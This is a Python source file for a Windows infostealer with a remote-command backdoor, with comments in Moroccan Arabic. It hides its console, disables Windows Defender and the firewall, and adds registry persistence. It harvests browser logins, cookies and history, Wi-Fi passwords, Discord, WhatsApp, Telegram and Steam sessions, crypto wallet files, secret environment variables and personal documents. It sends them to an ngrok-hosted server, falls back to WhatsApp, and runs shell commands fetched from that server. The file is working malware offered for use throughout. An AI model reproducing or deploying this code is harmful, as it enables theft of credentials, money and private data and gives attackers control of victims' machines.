#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import sqlite3
import shutil
import requests
import platform
import subprocess
import socket
import getpass
import re
import threading
import ctypes
import winreg
import base64
import tempfile
from datetime import datetime
from pathlib import Path

# ========== HIDE CONSOLE ==========
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ========== SERVER CONFIG ==========
SERVER_URL = "https://feel-handwork-porous.ngrok-free.dev"  # غير بالرابط ديالك

# ========== WHATSAPP CONFIG (احتياطي) ==========
WHATSAPP_PHONE = "212695119111"
CALLMEBOT_API_KEY = "YOUR_API_KEY_HERE"

# ========== SEND TO SERVER ==========
def send_to_server(data, endpoint="collect"):
    try:
        url = f"{SERVER_URL}/api/{endpoint}"
        headers = {"Content-Type": "application/json"}
        response = requests.post(url, json=data, headers=headers, timeout=30)
        return response.status_code == 200
    except:
        return False

# ========== SEND TO WHATSAPP (احتياطي) ==========
def send_to_whatsapp(message, is_file=False, file_path=None):
    if CALLMEBOT_API_KEY == "YOUR_API_KEY_HERE":
        return False
    try:
        if is_file and file_path and os.path.exists(file_path):
            url = "https://api.callmebot.com/whatsapp.php"
            params = {"phone": WHATSAPP_PHONE, "apikey": CALLMEBOT_API_KEY, "text": f"FILE: {os.path.basename(file_path)}"}
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = requests.post(url, params=params, files=files, timeout=30)
        else:
            url = "https://api.callmebot.com/whatsapp.php"
            params = {"phone": WHATSAPP_PHONE, "apikey": CALLMEBOT_API_KEY, "text": message[:4096]}
            response = requests.get(url, params=params, timeout=30)
        return response.status_code == 200
    except:
        return False

# ========== EXECUTE COMMANDS (BACKDOOR) ==========
def execute_command(cmd):
    try:
        if cmd.startswith("shutdown"):
            os.system("shutdown /s /t 5")
            return "Shutting down in 5 seconds..."
        elif cmd.startswith("restart"):
            os.system("shutdown /r /t 5")
            return "Restarting in 5 seconds..."
        elif cmd.startswith("wallpaper:"):
            img_path = cmd.split(":", 1)[1].strip()
            if os.path.exists(img_path):
                ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path, 0)
                return f"Wallpaper changed to {img_path}"
            else:
                return "Wallpaper file not found"
        elif cmd.startswith("msgbox:"):
            msg = cmd.split(":", 1)[1].strip()
            ctypes.windll.user32.MessageBoxW(0, msg, "VAPO LAGRI", 0)
            return f"Message box shown: {msg}"
        elif cmd.startswith("run:"):
            prog = cmd.split(":", 1)[1].strip()
            os.system(f'start {prog}')
            return f"Executed: {prog}"
        elif cmd.startswith("cmd:"):
            command = cmd.split(":", 1)[1].strip()
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return f"Command output: {result.stdout[:500]}\n{result.stderr[:500]}"
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f"Command output: {result.stdout[:500]}\n{result.stderr[:500]}"
    except Exception as e:
        return f"Error: {str(e)}"

# ========== CHECK FOR COMMANDS FROM SERVER ==========
def check_commands():
    hostname = socket.gethostname()
    print(f"[*] Command listener started for {hostname}")
    while True:
        try:
            url = f"{SERVER_URL}/api/command?hostname={hostname}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                cmd = data.get('command')
                if cmd:
                    print(f"[+] Received command: {cmd}")
                    result = execute_command(cmd)
                    print(f"[+] Command result: {result}")
                    try:
                        send_to_server({"hostname": hostname, "command_result": result}, "command_result")
                    except:
                        pass
                else:
                    print("[*] No commands")
            else:
                print(f"[-] Server error: {response.status_code}")
        except Exception as e:
            print(f"[-] Error checking commands: {e}")
        time.sleep(10)

# ========== SYSTEM INFO ==========
def get_system_info():
    info = {}
    try:
        info["hostname"] = socket.gethostname()
    except: pass
    try:
        info["username"] = getpass.getuser()
    except: pass
    try:
        info["os"] = platform.system() + " " + platform.release()
    except: pass
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except: pass
    try:
        r = requests.get("https://api.ipify.org", timeout=5)
        info["public_ip"] = r.text
    except:
        info["public_ip"] = "Unknown"
    try:
        r = requests.get("http://ip-api.com/json/", timeout=5)
        location = r.json()
        if location.get("status") == "success":
            info["country"] = location.get("country", "Unknown")
            info["city"] = location.get("city", "Unknown")
            info["isp"] = location.get("isp", "Unknown")
    except: pass
    info["timestamp"] = datetime.now().isoformat()
    return info

# ========== WHATSAPP SESSION ==========
def steal_whatsapp_session():
    sessions = []
    paths = [
        os.path.expanduser("~") + "/AppData/Roaming/WhatsApp",
        os.path.expanduser("~") + "/AppData/Local/WhatsApp",
        os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
        os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.bin', '.dat', '.db', '.key', '.ldb', '.log')):
                            sessions.append(os.path.join(root, file))
            except: pass
    return sessions

# ========== WHATSAPP TOKENS ==========
def steal_whatsapp_tokens():
    tokens = []
    token_pattern = r'[a-zA-Z0-9\-_]{24,}\.[a-zA-Z0-9\-_]{6,}\.[a-zA-Z0-9\-_]{27,}'
    paths = [
        os.path.expanduser("~") + "/AppData/Roaming/WhatsApp",
        os.path.expanduser("~") + "/AppData/Local/WhatsApp",
        os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
        os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.ldb', '.log', '.dat')):
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                found = re.findall(token_pattern, f.read())
                                tokens.extend(found)
            except: pass
    return list(set(tokens))

# ========== WHATSAPP BACKUPS ==========
def steal_whatsapp_backups():
    backups = []
    paths = [
        os.path.expanduser("~") + "/AppData/Roaming/WhatsApp/Backups",
        os.path.expanduser("~") + "/AppData/Local/WhatsApp/Backups",
        os.path.expanduser("~") + "/Downloads/WhatsApp Backups",
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith(('.crypt12', '.crypt14', '.db')):
                        backups.append(os.path.join(path, file))
            except: pass
    return backups

# ========== WHATSAPP CONTACTS ==========
def steal_whatsapp_contacts():
    contacts = []
    paths = [
        os.path.expanduser("~") + "/AppData/Roaming/WhatsApp/Data",
        os.path.expanduser("~") + "/AppData/Local/WhatsApp/Data",
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith('.db'):
                        contacts.append(os.path.join(path, file))
            except: pass
    return contacts

# ========== BROWSER PASSWORDS ==========
def steal_browser_passwords():
    passwords = []
    browsers = {
        "Chrome": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data",
        "Edge": os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Login Data",
        "Brave": os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data",
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            try:
                temp_path = os.path.join(os.environ["TEMP"], f"{name}_login.db")
                shutil.copy2(path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    if row[1] or row[2]:
                        passwords.append({
                            "browser": name,
                            "url": row[0],
                            "username": row[1] if row[1] else "",
                            "password": "ENCRYPTED"
                        })
                conn.close()
                os.remove(temp_path)
            except: pass
    return passwords

# ========== BROWSER COOKIES ==========
def steal_browser_cookies():
    cookies = []
    browsers = {
        "Chrome": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/Cookies",
        "Edge": os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
        "Brave": os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Cookies",
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            try:
                temp_path = os.path.join(os.environ["TEMP"], f"{name}_cookies.db")
                shutil.copy2(path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, path FROM cookies LIMIT 50")
                for row in cursor.fetchall():
                    cookies.append({
                        "browser": name,
                        "host": row[0],
                        "name": row[1],
                        "path": row[2]
                    })
                conn.close()
                os.remove(temp_path)
            except: pass
    return cookies

# ========== BROWSER HISTORY ==========
def steal_browser_history():
    history = []
    browsers = {
        "Chrome": os.path.expanduser("~") + "/AppData/Local/Google/Chrome/User Data/Default/History",
        "Edge": os.path.expanduser("~") + "/AppData/Local/Microsoft/Edge/User Data/Default/History",
        "Brave": os.path.expanduser("~") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            try:
                temp_path = os.path.join(os.environ["TEMP"], f"{name}_history.db")
                shutil.copy2(path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                for row in cursor.fetchall():
                    history.append({
                        "browser": name,
                        "url": row[0],
                        "title": row[1] if row[1] else "",
                        "visit_time": str(row[2]) if row[2] else ""
                    })
                conn.close()
                os.remove(temp_path)
            except: pass
    return history

# ========== WIFI PASSWORDS ==========
def steal_wifi():
    wifi_list = []
    if platform.system() == "Windows":
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
            profiles = [line.split(":")[1].strip() for line in output.split("\n") if ":" in line and "Profile" in line]
            for profile in profiles:
                try:
                    result = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True)
                    for line in result.split("\n"):
                        if "Key Content" in line:
                            wifi_list.append({"ssid": profile, "password": line.split(":")[1].strip()})
                            break
                except: pass
        except: pass
    return wifi_list

# ========== DISCORD TOKENS ==========
def steal_discord():
    tokens = []
    token_pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    discord_paths = [
        os.path.expanduser("~/AppData/Roaming/discord/Local Storage/leveldb"),
        os.path.expanduser("~/AppData/Roaming/BetterDiscord"),
        os.path.expanduser("~/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb"),
    ]
    for path in discord_paths:
        if os.path.exists(path):
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.ldb', '.log')):
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                found = re.findall(token_pattern, f.read())
                                tokens.extend(found)
            except: pass
    return list(set(tokens))

# ========== COLLECT FILES ==========
def steal_files():
    files = []
    extensions = ['.txt', '.json', '.env', '.config', '.conf', '.ini', '.xml', '.yaml', '.yml', '.log', '.csv', '.docx', '.xlsx', '.pdf', '.zip', '.rar', '.7z']
    user_dir = os.path.expanduser("~")
    search_dirs = [
        os.path.join(user_dir, "Desktop"),
        os.path.join(user_dir, "Documents"),
        os.path.join(user_dir, "Downloads"),
        os.path.join(user_dir, "Pictures"),
        os.path.join(user_dir, "Videos"),
        os.path.join(user_dir, "Music"),
        user_dir
    ]
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            try:
                for root, dirs, filenames in os.walk(search_dir):
                    if len(files) > 100:
                        break
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            filepath = os.path.join(root, filename)
                            try:
                                size = os.path.getsize(filepath)
                                if size < 1024 * 1024:
                                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if content.strip():
                                            files.append({
                                                "name": filename,
                                                "path": filepath,
                                                "size": size,
                                                "content": content[:500]
                                            })
                            except: pass
            except: pass
    return files

# ========== ENVIRONMENT VARIABLES ==========
def steal_env_vars():
    env_vars = {}
    sensitive_keys = ['API_KEY', 'SECRET', 'PASSWORD', 'TOKEN', 'KEY', 'AUTH', 'CREDENTIAL', 'STRIPE', 'TWILIO', 'AWS_', 'GITHUB', 'FACEBOOK', 'GOOGLE', 'AZURE', 'MONGODB', 'REDIS']
    for key, value in os.environ.items():
        if any(s in key.upper() for s in sensitive_keys):
            env_vars[key] = value[:100] if len(value) > 100 else value
    return env_vars

# ========== TELEGRAM SESSIONS ==========
def steal_telegram():
    sessions = []
    telegram_path = os.path.expanduser("~/AppData/Roaming/Telegram Desktop/tdata")
    if os.path.exists(telegram_path):
        try:
            for file in os.listdir(telegram_path):
                if file.endswith(('.key', '.dat', '.db')):
                    sessions.append(os.path.join(telegram_path, file))
        except: pass
    return sessions

# ========== STEAM SESSIONS ==========
def steal_steam():
    sessions = []
    steam_paths = [
        os.path.expanduser("~/AppData/Roaming/Steam"),
        os.path.expanduser("~/AppData/Local/Steam"),
    ]
    for path in steam_paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith(('.ssfn', '.vdf')):
                        sessions.append(os.path.join(path, file))
            except: pass
    return sessions

# ========== RDP PASSWORDS ==========
def steal_rdp():
    rdp_files = []
    path = os.path.expanduser("~/Documents")
    if os.path.exists(path):
        try:
            for file in os.listdir(path):
                if file.endswith('.rdp'):
                    rdp_files.append(os.path.join(path, file))
        except: pass
    return rdp_files

# ========== CRYPTO WALLETS ==========
def steal_crypto_wallets():
    wallets = []
    wallet_paths = [
        os.path.expanduser("~/AppData/Roaming/Bitcoin"),
        os.path.expanduser("~/AppData/Roaming/Ethereum"),
        os.path.expanduser("~/AppData/Roaming/Litecoin"),
        os.path.expanduser("~/AppData/Roaming/Monero"),
        os.path.expanduser("~/AppData/Roaming/Dogecoin"),
        os.path.expanduser("~/AppData/Roaming/Wallet"),
        os.path.expanduser("~/AppData/Roaming/Coinbase"),
        os.path.expanduser("~/AppData/Roaming/Binance"),
        os.path.expanduser("~/AppData/Roaming/MetaMask"),
        os.path.expanduser("~/AppData/Roaming/Trust Wallet"),
        os.path.expanduser("~/AppData/Roaming/Exodus"),
    ]
    for path in wallet_paths:
        if os.path.exists(path):
            try:
                for file in os.listdir(path):
                    if file.endswith(('.wallet', '.key', '.dat', '.json', '.txt')):
                        wallets.append(os.path.join(path, file))
            except: pass
    return wallets

# ========== STEAL ALL ==========
def steal_all():
    data = {
        "system": get_system_info(),
        "whatsapp_sessions": steal_whatsapp_session(),
        "whatsapp_tokens": steal_whatsapp_tokens(),
        "whatsapp_backups": steal_whatsapp_backups(),
        "whatsapp_contacts": steal_whatsapp_contacts(),
        "passwords": steal_browser_passwords(),
        "cookies": steal_browser_cookies(),
        "history": steal_browser_history(),
        "wifi": steal_wifi(),
        "discord": steal_discord(),
        "files": steal_files(),
        "env_vars": steal_env_vars(),
        "telegram": steal_telegram(),
        "steam": steal_steam(),
        "rdp": steal_rdp(),
        "crypto": steal_crypto_wallets(),
    }
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "hostname": data["system"]["hostname"],
        "username": data["system"]["username"],
        "ip": data["system"].get("public_ip", "Unknown"),
        "country": data["system"].get("country", "Unknown"),
        "city": data["system"].get("city", "Unknown"),
        "isp": data["system"].get("isp", "Unknown"),
        "summary": {
            "whatsapp_sessions": len(data["whatsapp_sessions"]),
            "whatsapp_tokens": len(data["whatsapp_tokens"]),
            "whatsapp_backups": len(data["whatsapp_backups"]),
            "whatsapp_contacts": len(data["whatsapp_contacts"]),
            "passwords": len(data["passwords"]),
            "cookies": len(data["cookies"]),
            "history": len(data["history"]),
            "wifi": len(data["wifi"]),
            "discord": len(data["discord"]),
            "files": len(data["files"]),
            "env_vars": len(data["env_vars"]),
            "telegram": len(data["telegram"]),
            "steam": len(data["steam"]),
            "rdp": len(data["rdp"]),
            "crypto": len(data["crypto"]),
        },
        "data": data
    }
    return report

# ========== SEND REPORT ==========
def send_report_to_server(report):
    try:
        success = send_to_server(report)
        if success:
            print("[+] Report sent to server successfully!")
        else:
            print("[-] Failed to send to server, trying WhatsApp...")
            send_report_to_whatsapp(report)
    except:
        pass

# ========== SEND REPORT TO WHATSAPP ==========
def send_report_to_whatsapp(report):
    try:
        filename = f"steal_{report['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        temp_file = os.path.join(os.environ["TEMP"], filename)
        
        with open(temp_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, default=str)
        
        msg = f"""STEALER REPORT
HOST: {report['hostname']}
USER: {report['username']}
IP: {report['ip']}
LOCATION: {report.get('country', '')} - {report.get('city', '')}
TIME: {report['timestamp']}

SUMMARY:
WhatsApp Sessions: {report['summary']['whatsapp_sessions']}
WhatsApp Tokens: {report['summary']['whatsapp_tokens']}
Passwords: {report['summary']['passwords']}
WiFi: {report['summary']['wifi']}
Discord: {report['summary']['discord']}
Files: {report['summary']['files']}
Crypto: {report['summary']['crypto']}"""
        
        send_to_whatsapp(msg)
        time.sleep(2)
        send_to_whatsapp("Full data", is_file=True, file_path=temp_file)
        
        try:
            os.remove(temp_file)
        except: pass
    except: pass

# ========== PERSISTENCE ==========
def add_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(key)
    except: pass

# ========== HIDE PROCESS ==========
def hide_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
    except: pass

# ========== DISABLE SECURITY ==========
def disable_security():
    try:
        os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
        os.system('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"')
        os.system('netsh advfirewall set allprofiles state off')
        os.system('taskkill /f /im MsMpEng.exe 2>nul')
        os.system('taskkill /f /im SecurityHealthService.exe 2>nul')
    except: pass

# ========== MAIN ==========
def main():
    hide_process()
    disable_security()
    add_persistence()
    
    # بدء خيط الاستماع للأوامر
    command_thread = threading.Thread(target=check_commands, daemon=True)
    command_thread.start()
    
    # سرقة البيانات وإرسالها
    report = steal_all()
    send_report_to_server(report)
    
    # البقاء في الخلفية
    try:
        while True:
            time.sleep(3600)
    except: pass

if __name__ == "__main__":
    try:
        main()
    except: pass